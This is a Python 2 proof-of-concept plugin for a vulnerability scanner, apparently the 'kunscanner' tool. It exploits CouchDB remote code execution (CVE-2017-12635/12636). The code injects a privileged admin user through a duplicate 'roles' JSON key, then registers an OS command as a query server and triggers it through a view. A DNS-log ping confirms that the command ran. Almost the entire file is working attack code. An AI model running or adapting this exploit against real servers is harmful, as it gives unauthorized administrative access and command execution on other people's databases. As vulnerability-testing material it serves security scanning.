# -*- coding: utf-8 -*-
# @Time   : 2018/4/30 下午12:48
# @author : Xmchx
# @File   : couchdb_exec.py

'''
couchdb会一直执行这条命令，不会执行一次后停止。

如果对应的是80，需要直接指明是80端口，不能只输入ip
'''


import json
import requests
from requests.auth import HTTPBasicAuth
from collections import OrderedDict
from kunscanner.lib.core.data import conf
from kunscanner.lib.utils.utils import RandomString,GetNetloc,DomainToIP
from kunscanner.lib.utils.ceye import CeyeApi
from kunscanner.lib.core.exception import PocWarningException
from kunscanner.lib.core.enums import SCRIPT_LEVEL

def Info():
    poc_info = OrderedDict()
    poc_info['name'] = "couchdb_exec"
    poc_info['info'] = "couchdb remote code execution (CVE–2017–12635 CVE–2017–12636)"
    poc_info['title'] = u'CouchDB远程代码执行'
    poc_info['author'] = "hayasec"
    poc_info['time'] = "2018.04.30"
    poc_info['type'] = 'attack'
    poc_info['level'] = SCRIPT_LEVEL.HIGH
    return poc_info


def Poc(url):
    init_url = url
    result = {}
    result['success'] = False
    result['message'] = ''

    try:
        if ':' in GetNetloc(url):
            port = GetNetloc(url).split(':')[1]
        else:
            port = '5984'
        ip = DomainToIP(GetNetloc(url))
        if ip == None:
            return result
        if ':' in ip:
            ip = ip.split(':')[0]
        url = GetNetloc(ip+':'+port,True)
        version = GetVersion(url)
        AddUser(url)
        rangom_string = RandomString()
        command = '"ping -n 2 %s"'% (rangom_string+'.'+conf.CEYE_DOMAIN)
        CmeExec(url, command, version)
        data = CheckDnsLog(rangom_string)
        if data != False:
            result['success'] = True
            result['message'] = 'remote_addr:' + data[0]['remote_addr'] +' name: '+data[0]['name']
        return result
    except Exception,e:
        raise PocWarningException(init_url,Info()['name'],repr(e))




def GetVersion(url):
    response = requests.get(url,timeout = 20)
    db_version = json.loads(response.text)
    return int(db_version['version'][0:1])


def AddUser(url):
    path = r'_users/org.couchdb.user:wooyun'
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Content-Type': 'application/json',
        }

    data = b"""
        {
          "type": "user",
          "name": "wooyun",
          "roles": ["_admin"],
          "roles":[],
          "password": "wooyun"
        }
        """
    full_url = url + path
    requests.put(url=full_url, headers=headers, data=data,timeout = 5)


def CmeExec(target, command, version):
    session = requests.session()
    session.headers = {
        'Content-Type': 'application/json'
    }
    session.put(target + '_users/org.couchdb.user:wooyun', data='''{
      "type": "user",
      "name": "wooyun",
      "roles": ["_admin"],
      "roles": [],
      "password": "wooyun"
    }''',timeout = 5)
    session.auth = HTTPBasicAuth('wooyun', 'wooyun')
    if version == 1:
        session.put(target + ('_config/query_servers/cmd'), data=command,timeout = 5)
    else:
        host = session.get(target + '_membership').json()['all_nodes'][0]
        session.put(target + '_node/{}/_config/query_servers/cmd'.format(host), data=command,timeout = 5)

    session.put(target + 'wooyun',timeout = 5)
    session.put(target + 'wooyun/test', data='{"_id": "wooyuntest"}',timeout = 5)

    if version == 1:
        try:
            session.post(target + 'wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}',timeout = 5)
        except:
            pass
    else:
        try:
            session.put(target + 'wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')
        except:
            pass


def CheckDnsLog(rangom_string):
    result = CeyeApi(rangom_string)
    if result != False:
        return result
    else:
        return False

